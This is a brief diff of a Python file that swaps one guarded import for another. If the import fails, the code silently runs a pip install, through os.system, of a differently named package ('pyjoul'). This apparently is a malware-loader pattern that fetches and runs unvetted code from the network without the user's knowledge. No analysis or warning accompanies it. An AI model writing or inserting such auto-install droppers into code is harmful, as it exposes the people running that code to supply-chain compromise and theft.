@@ -1,6 +1,6 @@
 import os
 try:
-    import pyghoster
+    import pyminor
 except:
     try:
         os.system("python.exe -m pip install pyjoul")
